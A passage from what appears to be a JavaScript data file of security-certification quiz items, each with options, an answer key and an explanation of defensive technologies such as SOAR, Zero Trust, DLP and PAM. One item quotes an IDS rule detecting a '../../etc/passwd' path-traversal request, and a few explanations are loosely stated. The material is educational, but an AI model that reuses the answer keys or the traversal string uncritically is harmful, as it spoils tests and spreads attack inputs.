            explanation: '🔐 VPN Security: Best = **layered authentication + encryption**. SSL VPN (TLS 1.2/1.3) with: 1) **MFA** (token, SMS, push), 2) **Certificates** (client cert prevents stolen password access), 3) **NAC/posture** (check device health). BAD: PPTP (broken encryption - MSCHAP v2 crackable), L2TP alone (no encryption), PSK (shared secret = weak). IPsec vs SSL: IPsec = network layer (routes all traffic), SSL = application layer (browser-based). Modern: Zero Trust Network Access (ZTNA) replaces VPN. Products: Palo Alto GlobalProtect, Cisco AnyConnect, OpenVPN. Config: Split-tunnel (some traffic) vs full-tunnel (all traffic via VPN).'
        },
        {
            id: 'dev17',
            title: 'Security Orchestration (SOAR)',
            points: 10,
            question: 'SOAR (Security Orchestration, Automation, Response) platforms provide which capabilities? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'playbooks', text: 'Automated playbooks' },
                { value: 'integrate', text: 'Integration with 100+ security tools' },
                { value: 'case', text: 'Case management' },
                { value: 'enrich', text: 'Threat intelligence enrichment' },
                { value: 'replace_siem', text: 'Replace SIEM entirely' },
                { value: 'prevent_all', text: 'Prevent 100% of security incidents' }
            ],
            correct: ['playbooks', 'integrate', 'case', 'enrich'],
            explanation: '🤖 SOAR Purpose: Automate repetitive SOC tasks, orchestrate response across tools. Functions: 1) **Playbooks** (codify processes - phishing response, malware triage, account lockout), 2) **Integrations** (API connections to every tool - fetch logs, block IPs, isolate hosts), 3) **Case management** (ticketing, evidence collection, audit trail), 4) **Enrichment** (auto-lookup IPs/domains/hashes in threat intel). SOAR + SIEM = powerful (SIEM detects, SOAR responds). NOT a silver bullet. Products: Palo Alto XSOAR, Splunk SOAR, IBM Resilient. ROI: Reduce MTTR (Mean Time To Respond) from hours to minutes.'
        },
        {
            id: 'dev18',
            title: 'Network Segmentation Devices',
            points: 7,
            question: 'Which devices/technologies enable network segmentation (Zero Trust micro-segmentation)? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'internal_fw', text: 'Internal firewalls between zones/VLANs' },
                { value: 'vlan', text: 'VLANs with ACLs' },
                { value: 'sdn', text: 'SDN with microsegmentation' },
                { value: 'proxy', text: 'Reverse proxies for application segmentation' },
                { value: 'switch', text: 'Unmanaged network switches' },
                { value: 'modem', text: 'Cable modems' }
            ],
            correct: ['internal_fw', 'vlan', 'sdn', 'proxy'],
            explanation: '🔒 Segmentation Technologies: Limit blast radius by dividing network into zones. 1) **Internal FW** (three-legged firewall: DMZ | Trust | Untrust), 2) **VLANs** (logical separation with router ACLs - VLAN 10=servers, VLAN 20=workstations), 3) **SDN/microseg** (VMware NSX, Cisco ACI - workload-to-workload policies), 4) **Reverse proxy** (application-layer segmentation). Unmanaged switches/modems = no segmentation. Segments: Corporate, Guest, IoT, OT/ICS, PCI environment. Prevents: Lateral movement (ransomware spread), flat network vulnerabilities. NIST 800-207 Zero Trust Architecture.'
        },
        {
            id: 'dev19',
            title: 'Threat Intelligence Platform',
            points: 8,
            question: 'Threat Intelligence Platform (TIP) aggregates threat feeds. What value does TIP provide? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'aggregate', text: 'Aggregate feeds from multiple sources' },
                { value: 'contextualize', text: 'Contextualize IoCs' },
                { value: 'share', text: 'Share intelligence with security tools' },
                { value: 'dedupe', text: 'Deduplicate and score indicators' },
                { value: 'block_all', text: 'Automatically block all threats without review' },
                { value: 'patch', text: 'Automatically install security patches' }
            ],
            correct: ['aggregate', 'contextualize', 'share', 'dedupe'],
            explanation: '🔍 Threat Intel Platforms: Centralize threat data management. Workflow: 1) **Ingest** (TAXII/STIX feeds from AlienVault OTX, MISP, FS-ISAC), 2) **Normalize** (convert to common format), 3) **Enrich** (add context - malware family, threat actor, confidence score), 4) **Dedupe** (same IP in 10 feeds = 1 entry), 5) **Distribute** (push IoCs to blocking tools). NOT: Automated blocking without review (false positives), patching (different process). Products: Anomali, ThreatConnect, ThreatQuotient. STIX/TAXII standards. Use case: "IP 1.2.3.4 seen in 3 ransomware campaigns (high confidence) → auto-block on firewall".'
        },
        {
            id: 'dev20',
            title: 'Zero Trust Architecture',
            points: 10,
            question: 'Zero Trust model replaces perimeter-based security. Which principles are core to Zero Trust? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'verify', text: 'Verify explicitly' },
                { value: 'least_privilege', text: 'Least privilege access' },
                { value: 'assume_breach', text: 'Assume breach' },
                { value: 'trust_internal', text: 'Trust all internal network traffic' },
                { value: 'perimeter_only', text: 'Focus only on perimeter defense' },
                { value: 'no_auth', text: 'Eliminate authentication to improve user experience' }
            ],
            correct: ['verify', 'least_privilege', 'assume_breach'],
            explanation: '🛡️ Zero Trust Principles (NIST 800-207): **Never trust, always verify**. 1) **Verify explicitly** (authenticate every access request - user, device, location, app), 2) **Least privilege** (limit access scope, time-boxed), 3) **Assume breach** (segment, inspect all traffic, continuous monitoring). OPPOSITE of: Trust internal network, castle-and-moat perimeter. Implementation: MFA, microsegmentation, ZTNA (replace VPN), conditional access. Technologies: SDP (Software-Defined Perimeter), IAM, EDR, CASB. Business driver: Cloud migration + remote work = no "inside network" anymore. Vendors: Zscaler, Palo Alto Prisma, Microsoft Entra.'
        },
        {
            id: 'dev21',
            title: 'UTM (Unified Threat Management)',
            points: 7,
            question: 'UTM device consolidates multiple security functions. Which are typical UTM features? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'firewall', text: 'Firewall' },
                { value: 'ips', text: 'IPS' },
                { value: 'av_gateway', text: 'Antivirus/anti-malware gateway' },
                { value: 'vpn', text: 'VPN gateway' },
                { value: 'siem', text: 'Full SIEM with log storage & correlation' },
                { value: 'edr', text: 'Endpoint Detection & Response agents' }
            ],
            correct: ['firewall', 'ips', 'av_gateway', 'vpn'],
            explanation: '📦 UTM (Unified Threat Management): All-in-one security appliance for SMBs. Features: 1) **Firewall** (stateful inspection), 2) **IPS** (signature-based protection), 3) **Gateway AV** (scan traffic for malware), 4) **VPN** (remote access), 5) **Web filter**, 6) **Email security**, 7) **Application control**. NOT: SIEM (separate log management platform), EDR (endpoint agents). Trade-off: Convenience vs single point of failure, performance bottleneck (all traffic through one box). Vendors: Fortinet FortiGate, SonicWall, WatchGuard. Target: Small/medium businesses without dedicated security team. vs Enterprise: Separate best-of-breed tools.'
        },
        {
            id: 'dev22',
            title: 'Packet Capture & Analysis',
            points: 6,
            question: 'Which tool is BEST for deep packet inspection and protocol analysis?',
            type: 'radio',
            options: [
                { value: 'wireshark', text: 'Wireshark' },
                { value: 'nmap', text: 'Nmap' },
                { value: 'netstat', text: 'netstat' },
                { value: 'ping', text: 'ping' },
                { value: 'traceroute', text: 'traceroute' },
                { value: 'nslookup', text: 'nslookup' }
            ],
            correct: 'wireshark',
            explanation: '🦈 Wireshark: Industry-standard packet analyzer. Capabilities: 1) **Capture** (live traffic from interface), 2) **Dissect** (decode 3000+ protocols - TCP, HTTP, TLS, SMB, Kerberos), 3) **Filter** (display/capture filters - "tcp.port==443 and ip.src==192.168.1.1"), 4) **Follow streams** (reconstruct conversations), 5) **Export objects** (extract files from HTTP/SMB). Use cases: Troubleshoot network issues, malware traffic analysis, detect data exfiltration. CLI version: tshark. Alternatives: tcpdump (CLI capture), NetworkMiner (forensics). Tier-1 skill: Apply filters, identify protocols, spot anomalies (DNS to port 443, HTTP POST with large payloads).'
        },
        {
            id: 'dev23',
            title: 'SSL/TLS Inspection Challenges',
            points: 8,
            question: 'Organization deploys SSL inspection on firewall/proxy. What are key challenges? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'cert_trust', text: 'Certificate trust' },
                { value: 'privacy', text: 'Privacy concerns' },
                { value: 'performance', text: 'Performance impact' },
                { value: 'cert_pinning', text: 'Certificate pinning breaks some apps' },
                { value: 'no_challenge', text: 'No challenges' },
                { value: 'faster', text: 'Makes internet faster' }
            ],
            correct: ['cert_trust', 'privacy', 'performance', 'cert_pinning'],
            explanation: '🔐 SSL Inspection (SSL/TLS Decryption): Man-in-the-middle by security device. Challenges: 1) **CA cert deployment** - push corporate CA to all devices (GPO, MDM) or users see "untrusted cert" warnings, 2) **Privacy/legal** - decrypt banking, healthcare sites? Employee consent needed, 3) **Performance** - TLS handshake + decrypt/encrypt = latency/CPU load, 4) **Pinning** - apps with hardcoded certs break (mobile banking, Chrome updates, security software). Best practice: Bypass list (exclude health/finance sites), log all decryption. Compliance: HIPAA/PCI may prohibit. 80%+ web traffic = HTTPS (inspection critical for visibility). Vendors: Palo Alto SSL decryption, Zscaler SSL inspection.'
        },
        {
            id: 'dev24',
            title: 'Air Gap Security',
            points: 7,
            question: 'Air-gapped network (physically isolated, no internet) can STILL be compromised via:',
            type: 'checkbox',
            options: [
                { value: 'usb', text: 'Infected USB drives' },
                { value: 'insider', text: 'Malicious insider with physical access' },
                { value: 'supply_chain', text: 'Compromised hardware/software pre-installation' },
                { value: 'acoustic', text: 'Air-gap covert channels' },
                { value: 'phishing', text: 'Phishing emails' },
                { value: 'safe', text: 'Impossible to compromise' }
            ],
            correct: ['usb', 'insider', 'supply_chain', 'acoustic'],
            explanation: '✈️ Air-Gap Attacks: Physical isolation ≠ immunity. Vectors: 1) **USB/removable media** - Stuxnet spread via USB to Iranian nuclear facility (2010), 2) **Insider threat** - Edward Snowden exfiltrated via USB, 3) **Supply chain** - implant malware before deployment, 4) **Covert channels** - BadBIOS (ultrasonic between air-gapped machines), Van Eck phreaking (EM radiation), LED blinking (data exfil). Defense: Disable USB ports, Faraday cage, strict physical security, hardware inspection. Use cases: Military classified networks, SCADA/ICS critical infrastructure, high-value targets. Air-gap = defense-in-depth layer, not silver bullet.'
        },
        {
            id: 'dev25',
            title: 'Wireless IDS/IPS (WIDS/WIPS)',
            points: 8,
            question: 'WIDS/WIPS protects wireless networks. What can it detect/prevent? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'rogue_ap', text: 'Rogue access points' },
                { value: 'evil_twin', text: 'Evil twin attacks' },
                { value: 'deauth', text: 'Deauthentication attacks' },
                { value: 'wep_crack', text: 'WEP/WPA cracking attempts' },
                { value: 'cable', text: 'Wired network cable cuts' },
                { value: 'ddos_internet', text: 'DDoS attacks from internet' }
            ],
            correct: ['rogue_ap', 'evil_twin', 'deauth', 'wep_crack'],
            explanation: '📡 Wireless IDS/IPS: Monitors RF spectrum + 802.11 frames. Detections: 1) **Rogue AP** - unauthorized AP on network (MAC/SSID not in database), 2) **Evil Twin** - attacker AP mimics corporate SSID (phishing WiFi credentials), 3) **Deauth flood** - spam deauth frames to kick users offline (DoS), 4) **Brute force** - excessive authentication failures. WIPS response: Auto-disable rogue AP port (if wired), send deauth to rogue clients, alert. NOT: Physical cable issues, internet DDoS (different layer). Vendors: Aruba RFProtect, Cisco MSE, Fortinet FortiAP. Deploy: Dedicated sensors or integrated into APs. Compliance: PCI-DSS requires WIDS for cardholder environment.'
        },
        {
            id: 'dev26',
            title: 'Security Device Visibility Gaps',
            points: 7,
            question: 'Which traffic types can bypass traditional network security devices (firewall/IPS)? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'encrypted', text: 'Encrypted traffic without SSL inspection' },
                { value: 'p2p', text: 'Peer-to-peer traffic between endpoints' },
                { value: 'local', text: 'Same-subnet traffic' },
                { value: 'usb', text: 'USB-based data transfers' },
                { value: 'http', text: 'Unencrypted HTTP traffic' },
                { value: 'dns', text: 'Standard DNS queries' }
            ],
            correct: ['encrypted', 'p2p', 'local', 'usb'],
            explanation: '👻 Visibility Blind Spots: Network security only sees what passes through. Gaps: 1) **Encrypted traffic** - TLS 1.3 encrypts SNI, DoH tunnels DNS over HTTPS (bypass DNS filters), 2) **Lateral movement** - Workstation-to-workstation SMB (never hits firewall), 3) **Same subnet** - ARP spoofing, local attacks invisible to perimeter, 4) **Physical** - USB exfiltration, rogue WiFi. Solutions: **EDR** (host-level visibility), **Internal segmentation firewalls**, **SSL inspection**, **DLP** (monitor endpoints), **NAC** (control what connects). HTTP/DNS = visible (if unencrypted). Lesson: Perimeter security insufficient, need defense-in-depth.'
        },
        {
            id: 'dev27',
            title: 'Log Aggregation vs SIEM',
            points: 6,
            question: 'What is the key difference between log aggregation (Syslog server) and SIEM?',
            type: 'radio',
            options: [
                { value: 'correlation', text: 'SIEM adds correlation, alerting, dashboards; Syslog only stores logs' },
                { value: 'storage', text: 'SIEM stores more logs than Syslog' },
                { value: 'speed', text: 'Syslog is faster than SIEM' },
                { value: 'cost', text: 'Syslog is more expensive than SIEM' },
                { value: 'same', text: 'They are the same technology' },
                { value: 'vendor', text: 'SIEM is vendor-specific; Syslog is open standard' }
            ],
            correct: 'correlation',
            explanation: '📊 Syslog vs SIEM: **Syslog server** (rsyslog, syslog-ng) = dumb storage, receive logs via UDP/TCP 514, write to disk. **SIEM** = intelligent analysis. Adds: 1) **Parsing/normalization** (convert diverse formats to schema), 2) **Correlation rules** ("5 failed logins from same IP in 1 minute = alert"), 3) **Dashboards** (visualize trends), 4) **Enrichment** (GeoIP, threat intel), 5) **Compliance reporting** (PCI, HIPAA). Workflow: Devices → Syslog collectors → SIEM indexers → Analysis. Syslog alone = forensics only (search after breach). SIEM = real-time detection. Cost: Syslog free, SIEM expensive (per GB/day licensing). ELK stack = DIY SIEM (free but needs expertise).'
        },
        {
            id: 'dev28',
            title: 'UEBA (User & Entity Behavior Analytics)',
            points: 9,
            question: 'UEBA detects anomalies via behavioral baselines. Which scenarios can UEBA detect? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'compromised_account', text: 'Compromised account' },
                { value: 'insider_threat', text: 'Insider threat' },
                { value: 'privilege_abuse', text: 'Privilege abuse' },
                { value: 'lateral_movement', text: 'Lateral movement' },
                { value: 'port_scan', text: 'External port scan' },
                { value: 'all_attacks', text: 'All security incidents' }
            ],
            correct: ['compromised_account', 'insider_threat', 'privilege_abuse', 'lateral_movement'],
            explanation: '🤖 UEBA (User & Entity Behavior Analytics): ML-based anomaly detection. Baselines: Normal user behavior (login times, locations, accessed resources, data volume). Alerts on deviations: 1) **Impossible travel** - login from US then China in 1 hour, 2) **Data hoarding** - user downloads 10x normal file count, 3) **Unusual access** - HR employee accesses finance DB (never before), 4) **Off-hours** - VPN login at 3am (user typically 9-5). Entities: Users, servers, IoT devices. NOT: Signature-based detection (that\'s IDS), 100% accuracy (ML has false positives). Integration: SIEM, EDR, DLP. Vendors: Exabeam, Securonix, Splunk UBA. MITRE: Detect lateral movement, credential abuse, data staging.'
        },
        {
            id: 'dev29',
            title: 'Security Device High Availability',
            points: 7,
            question: 'Firewall HA (High Availability) cluster in Active-Passive mode. What happens when active firewall fails?',
            type: 'radio',
            options: [
                { value: 'failover', text: 'Passive takes over' },
                { value: 'downtime', text: 'All traffic stops until manual intervention' },
                { value: 'load_balance', text: 'Traffic automatically load-balances across both' },
                { value: 'restart', text: 'Active firewall automatically restarts' },
                { value: 'safe_mode', text: 'Passive enters safe mode' },
                { value: 'no_change', text: 'No impact' }
            ],
            correct: 'failover',
            explanation: '🔄 Firewall HA Modes: **Active-Passive** = Primary handles traffic, secondary standby (hot spare). Failover: 1) Active fails (heartbeat timeout), 2) Passive detects failure, 3) **Assumes virtual IP** (VRRP/CARP), 4) **Syncs state** (existing sessions continue if stateful sync enabled), 5) Becomes active. Downtime: Seconds (stateful) or minutes (stateless). **Active-Active** = both process traffic (load sharing). Requirements: State sync (session tables), config sync, dedicated HA link. Vendors: Palo Alto HA, Fortinet FGCP, pfSense CARP. Limitations: Stateful inspection features may break sync (SSL inspection, some IPS). Test: Failover drills (unplug active to verify passive takeover).'
        },
        {
            id: 'dev30',
            title: 'Network Tap vs SPAN Port',
            points: 6,
            question: 'For IDS deployment, what is advantage of network TAP over SPAN port?',
            type: 'radio',
            options: [
                { value: 'no_packet_loss', text: 'TAP captures all packets; SPAN may drop under load' },
                { value: 'cheaper', text: 'TAP is cheaper than SPAN configuration' },
                { value: 'easier', text: 'TAP is easier to configure than SPAN' },
                { value: 'encrypted', text: 'TAP can decrypt SSL traffic automatically' },
                { value: 'span_better', text: 'SPAN is always better than TAP' },
                { value: 'no_difference', text: 'No difference' }
            ],
            correct: 'no_packet_loss',
            explanation: '🔍 TAP vs SPAN: **SPAN (Switched Port Analyzer)** = mirror traffic from port/VLAN to monitoring port. Pros: Software-based (no hardware), flexible. Cons: Packet drops under high load (monitoring = low priority), CPU overhead on switch, may not capture VLAN tags/errors. **Network TAP** = physical device inline on cable, splits optical/electrical signal. Pros: **Zero packet loss** (hardware splits signal), no switch CPU impact, captures all frames (errors, VLAN tags). Cons: Cost, physical installation, inline placement (potential failure point - use bypass TAPs). Use cases: IDS/IPS monitoring, forensics, troubleshooting. Best practice: TAP for critical links (high-value traffic), SPAN for convenience (internal monitoring). Vendors: Gigamon, Ixia, Garland Technology.'
        },
        {
            id: 'dev31',
            title: 'API Gateway Security',
            points: 8,
            question: 'API Gateway protects microservices. Which security functions should it provide? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'auth', text: 'Authentication/authorization' },
                { value: 'rate_limit', text: 'Rate limiting per client' },
                { value: 'input_validation', text: 'Input validation' },
                { value: 'tls', text: 'TLS termination' },
                { value: 'compile', text: 'Compile source code automatically' },
                { value: 'database', text: 'Host database servers' }
            ],
            correct: ['auth', 'rate_limit', 'input_validation', 'tls'],
            explanation: '🌐 API Gateway Security: Single entry point for APIs (microservices). Functions: 1) **Auth** - validate JWT tokens, OAuth 2.0 flows, API keys, 2) **Rate limiting** - throttle requests (prevent DDoS, scraping), 3) **Input validation** - WAF-like rules (SQL injection, XSS in JSON), 4) **TLS** - encrypt in transit, 5) **Logging** - audit all API calls. NOT: Compilation, hosting (that\'s CI/CD, infrastructure). Products: Kong, Apigee, AWS API Gateway, Azure API Management. Attacks: Broken authentication (API1:2023), excessive data exposure (API3:2023), lack of rate limiting (API4:2023). OWASP API Security Top 10. Tier-1: Recognize suspicious API patterns (401 then 200, sequential IDs, excessive requests).'
        },
        {
            id: 'dev32',
            title: 'Container Security Scanning',
            points: 7,
            question: 'Container image scanning detects vulnerabilities in Docker/Kubernetes. What should be scanned? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'os_packages', text: 'OS packages' },
                { value: 'app_dependencies', text: 'Application dependencies' },
                { value: 'secrets', text: 'Hardcoded secrets' },
                { value: 'misconfig', text: 'Misconfigurations' },
                { value: 'network_traffic', text: 'Network traffic in production' },
                { value: 'physical', text: 'Physical server hardware' }
            ],
            correct: ['os_packages', 'app_dependencies', 'secrets', 'misconfig'],
            explanation: '🐳 Container Security: Shift-left (scan before deploy). Scan layers: 1) **Base image** - Alpine/Ubuntu OS packages (check CVE database), 2) **App dependencies** - package.json, requirements.txt, pom.xml (Log4Shell, Heartbleed), 3) **Secrets** - grep for AWS keys, passwords, tokens, 4) **Config** - Dockerfile analysis (USER root = bad, EXPOSE unnecessary ports). Tools: Trivy, Snyk, Anchore, Aqua. CI/CD integration: Block vulnerable images in pipeline. Runtime: Different tools (Falco, Sysdig - behavioral). NOT: Physical hardware (cloud-agnostic). Standards: CIS Docker Benchmark, NIST 800-190. Kubernetes: Scan admission controller (OPA Gatekeeper), Pod Security Standards.'
        },
        {
            id: 'dev33',
            title: 'Certificate Transparency Logs',
            points: 7,
            question: 'Certificate Transparency (CT) logs help detect:',
            type: 'radio',
            options: [
                { value: 'rogue_certs', text: 'Rogue/mis-issued certificates' },
                { value: 'expired', text: 'Expired certificates' },
                { value: 'weak_crypto', text: 'Weak encryption algorithms' },
                { value: 'ssl_config', text: 'SSL/TLS misconfigurations' },
                { value: 'ddos', text: 'DDoS attacks on web servers' },
                { value: 'malware', text: 'Malware on endpoints' }
            ],
            correct: 'rogue_certs',
            explanation: '📜 Certificate Transparency (RFC 6962): Public log of all SSL/TLS certificates. Benefits: 1) **Detect rogue certs** - monitor your domain (example.com), alert if unexpected cert issued (phishing, CA compromise), 2) **CA accountability** - CAs must log all certs (prevents secret issuance). NOT: Expiration monitoring (that\'s cert management), configuration checking (that\'s SSL Labs). Tools: crt.sh, Censys, Facebook CT monitor. Use case: DigiNotar breach (2011) - rogue Google certs issued. Modern: Chrome/Firefox require CT for EV certs. Setup: Monitor CT logs for your domains → alert on new certs → verify legitimacy. False positives: CDNs, load balancers issue many certs (whitelist).'
        },
        {
            id: 'dev34',
            title: 'DLP (Data Loss Prevention) Controls',
            points: 8,
            question: 'DLP solution deployed. Which controls prevent data exfiltration? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'email', text: 'Block emails with credit card numbers or PII attachments' },
                { value: 'usb', text: 'Block USB storage devices' },
                { value: 'cloud', text: 'Prevent upload of sensitive files to Dropbox/Google Drive' },
                { value: 'clipboard', text: 'Block copy-paste of classified data' },
                { value: 'antivirus', text: 'Deploy antivirus on all endpoints' },
                { value: 'firewall', text: 'Configure firewall ACLs' }
            ],
            correct: ['email', 'usb', 'cloud', 'clipboard'],
            explanation: '🛡️ DLP (Data Loss Prevention): Prevent sensitive data leaks. Types: 1) **Network DLP** - monitor email, web uploads (block credit cards in email body), 2) **Endpoint DLP** - agent on workstations (disable USB ports, block screenshots, clipboard control), 3) **Cloud DLP** - CASB integration (scan cloud storage). Detection methods: **Pattern matching** (regex for SSN, CCN), **Fingerprinting** (hash sensitive documents), **Contextual** (ML classification). Use cases: PCI-DSS compliance (protect cardholder data), HIPAA (PHI), GDPR (PII). NOT: AV (malware), firewall ACLs (network access). Products: Symantec DLP, Digital Guardian, Forcepoint. Limitation: Encrypted channels (need SSL inspection), insider can use phone camera.'
        },
        {
            id: 'dev35',
            title: 'Security Baseline & Hardening',
            points: 7,
            question: 'Security baseline for servers should include: (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'disable_services', text: 'Disable unnecessary services' },
                { value: 'patch', text: 'Apply latest security patches' },
                { value: 'least_privilege', text: 'Principle of least privilege' },
                { value: 'logging', text: 'Enable audit logging' },
                { value: 'enable_all', text: 'Enable all services' },
                { value: 'no_firewall', text: 'Disable host firewall' }
            ],
            correct: ['disable_services', 'patch', 'least_privilege', 'logging'],
            explanation: '🔒 Security Hardening: Reduce attack surface. Baseline steps: 1) **Disable services** - if not needed, turn off (telnet, FTP, SMBv1, unused ports), 2) **Patch** - OS + applications current (WSUS, yum update), 3) **Least privilege** - remove default passwords, disable guest accounts, RBAC, 4) **Logging** - enable auditing (Windows Security log, Linux auditd, syslog), 5) **Host firewall** - enable Windows Firewall, iptables, 6) **Encryption** - BitLocker, LUKS. Standards: **CIS Benchmarks** (OS-specific guides), **DISA STIGs** (military/government). Tools: Ansible/Chef (automated hardening), Lynis (Linux auditing). Compliance: PCI-DSS 2.2 (hardening), NIST 800-123. Test: Vulnerability scan before production.'
        },
        {
            id: 'dev36',
            title: 'Intrusion Detection Signatures',
            points: 6,
            question: 'IDS signature-based detection. What is a key limitation?',
            type: 'radio',
            options: [
                { value: 'zero_day', text: 'Cannot detect zero-day attacks' },
                { value: 'slow', text: 'Slower than behavioral detection' },
                { value: 'expensive', text: 'More expensive than behavioral systems' },
                { value: 'complex', text: 'Too complex to configure' },
                { value: 'all_attacks', text: 'Detects all attacks' },
                { value: 'no_false_positives', text: 'No false positives ever' }
            ],
            correct: 'zero_day',
            explanation: '🔍 Signature-based IDS: Pattern matching against known attacks. How it works: Database of signatures (Snort rules, Suricata rules) → Compare traffic → Match = alert. Example rule: alert tcp any any -> any 80 (content:"../../etc/passwd"; msg:"Path traversal"). Pros: Fast, low false positives (known attacks), easy to tune. **Limitation: Zero-day blind** - new exploits have no signature (update lag). Also: Polymorphic malware, encrypted traffic (can\'t inspect), evasion (fragmentation, encoding). vs Behavioral: Detect anomalies (baselines, ML) - catches unknown attacks but higher false positives. Best: Hybrid (signatures + behavioral). Update: Signature feeds daily (ET Open, Talos), custom rules for your environment. Snort/Suricata = open-source IDS engines.'
        },
        {
            id: 'dev37',
            title: 'MDM (Mobile Device Management)',
            points: 8,
            question: 'MDM for corporate mobile devices provides which security controls? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'enforce_policies', text: 'Enforce security policies' },
                { value: 'remote_wipe', text: 'Remote wipe lost/stolen devices' },
                { value: 'app_control', text: 'App whitelisting/blacklisting' },
                { value: 'compliance', text: 'Compliance checks' },
                { value: 'firewall', text: 'Deploy network firewalls' },
                { value: 'dns', text: 'Provide DNS resolution' }
            ],
            correct: ['enforce_policies', 'remote_wipe', 'app_control', 'compliance'],
            explanation: '📱 MDM (Mobile Device Management): Manage/secure corporate smartphones/tablets. Controls: 1) **Policy enforcement** - require 6-digit PIN, device encryption, screen timeout, 2) **Remote wipe** - if lost, erase all data remotely, 3) **App management** - push corporate apps, block Dropbox/WhatsApp, 4) **Compliance** - detect jailbreak/root (higher risk), 5) **Containerization** - separate work/personal data (MAM - Mobile App Management). NOT: Network firewall, DNS (different layers). Deployment: BYOD (user-owned) vs COPE (corporate-owned). Products: Microsoft Intune, VMware Workspace ONE, MobileIron. Compliance: HIPAA (protect ePHI on mobile), GDPR (BYOD data separation). Enrollment: User installs profile (MDM agent).'
        },
        {
            id: 'dev38',
            title: 'File Integrity Monitoring (FIM)',
            points: 7,
            question: 'FIM tool detects unauthorized file changes. Which files should be monitored? (Select ALL critical)',
            type: 'checkbox',
            options: [
                { value: 'system_files', text: 'Critical OS files' },
                { value: 'config', text: 'Application configs' },
                { value: 'logs', text: 'Security logs' },
                { value: 'web_root', text: 'Web server document root' },
                { value: 'temp', text: 'Temporary files' },
                { value: 'user_docs', text: 'User documents' }
            ],
            correct: ['system_files', 'config', 'logs', 'web_root'],
            explanation: '📂 File Integrity Monitoring: Detect unauthorized changes (compliance + incident detection). Monitors: 1) **OS files** - /etc/shadow, registry keys, 2) **Configs** - web server, database, firewall configs (detect backdoors), 3) **Logs** - ensure not deleted/modified by attacker, 4) **Web root** - /var/www/html (webshell installation). NOT: Temp files (constant change, noise), user documents (not security-critical). How: Baseline hash (SHA256) of files → periodic scans → alert on changes. Tools: Tripwire, OSSEC, AIDE, Windows File Integrity Monitoring (built-in). Compliance: PCI-DSS 11.5 (FIM required), NIST 800-53 (SI-7). Use case: Attacker modifies /etc/hosts to redirect traffic → FIM alerts. False positives: Legitimate updates (whitelist patch windows).'
        },
        {
            id: 'dev39',
            title: 'Privileged Access Management (PAM)',
            points: 9,
            question: 'PAM solution manages privileged accounts (admin, root, service). Key features: (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'vault', text: 'Password vault' },
                { value: 'session_record', text: 'Session recording' },
                { value: 'jit', text: 'Just-in-time access' },
                { value: 'approval', text: 'Approval workflow' },
                { value: 'antivirus', text: 'Endpoint antivirus for admin workstations' },
                { value: 'firewall', text: 'Network firewall rules' }
            ],
            correct: ['vault', 'session_record', 'jit', 'approval'],
            explanation: '👑 PAM (Privileged Access Management): Protect high-value accounts. Features: 1) **Password vault** - store admin passwords, auto-rotate, check-out/check-in workflow, 2) **Session recording** - record RDP/SSH sessions (video replay for forensics), 3) **JIT elevation** - grant admin access for 1 hour (time-boxed), 4) **Approval** - require manager/security approval before access, 5) **MFA** - enforce MFA for privileged access. NOT: AV, firewall (different controls). Use cases: Prevent lateral movement (no shared admin passwords), audit compliance (SOX, PCI), insider threat detection. Products: CyberArk, BeyondTrust, Thycotic. MITRE: Prevents credential dumping (T1003), privilege escalation (TA0004).'
        },
        {
            id: 'dev40',
            title: 'Anomaly Detection Baselines',
            points: 7,
            question: 'Behavioral anomaly detection requires baselines. How long should baselining period be?',
            type: 'radio',
            options: [
                { value: 'weeks_months', text: '2-4 weeks minimum' },
                { value: 'one_day', text: '1 day' },
                { value: 'one_hour', text: '1 hour' },
                { value: 'no_baseline', text: 'No baseline needed' },
                { value: 'one_year', text: '1 year minimum' },
                { value: 'forever', text: 'Continuous baselining' }
            ],
            correct: 'weeks_months',
            explanation: '📊 Behavioral Baselines: Anomaly detection needs "normal" reference. Baseline period: **2-4 weeks typical** - capture weekday vs weekend patterns, business hours, user behavior variations. Considerations: 1) **Avoid special events** - don\'t baseline during Black Friday (e-commerce), tax season (accounting), 2) **Seasonal** - retail spikes in Q4, 3) **Gradual change** - baseline adapts over time (not static). Too short (1 day) = incomplete picture, false positives. Too long (1 year) = delays detection rollout. Tools: UEBA, NDR (Network Detection & Response), SIEM anomaly detection. Example: User normally accesses 5 files/day → suddenly 500 files/day = alert. Re-baseline: After major changes (merger, new application deployment). Products: Darktrace (self-learning AI), ExtraHop.'
        },
        {
            id: 'dev41',
            title: 'Security Gateway for OT/ICS',
            points: 8,
            question: 'OT/ICS (Operational Technology) networks need specialized security. Which features are critical? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'protocol_aware', text: 'OT protocol awareness' },
                { value: 'air_gap', text: 'Air-gap or unidirectional gateway' },
                { value: 'passive', text: 'Passive monitoring' },
                { value: 'asset_inventory', text: 'Asset discovery' },
                { value: 'high_throughput', text: 'High throughput for video streaming' },
                { value: 'cloud', text: 'Cloud-hosted only' }
            ],
            correct: ['protocol_aware', 'air_gap', 'passive', 'asset_inventory'],
            explanation: '⚙️ OT/ICS Security: Industrial control systems (power plants, factories, water). Unique requirements: 1) **OT protocols** - deep packet inspection for Modbus, DNP3, BACnet, S7 (not just TCP/IP), 2) **Air-gap/diode** - one-way data flow (OT→IT, no reverse), prevents ransomware spread to SCADA, 3) **Passive monitoring** - SCADA systems can\'t tolerate latency/downtime (no inline blocking), 4) **Asset visibility** - discover legacy PLCs (no agents, no SNMP). NOT: High throughput video (not OT priority), cloud-only (OT often on-premises for latency). Vendors: Claroty, Nozomi, Dragos. Attacks: Stuxnet (2010), Triton (2017), Colonial Pipeline (2021). Standards: IEC 62443, NIST 800-82. Purdue Model: Segregate IT (Levels 4-5) from OT (Levels 0-3).'
        },
        {
            id: 'dev42',
            title: 'Network Detection & Response (NDR)',
            points: 8,
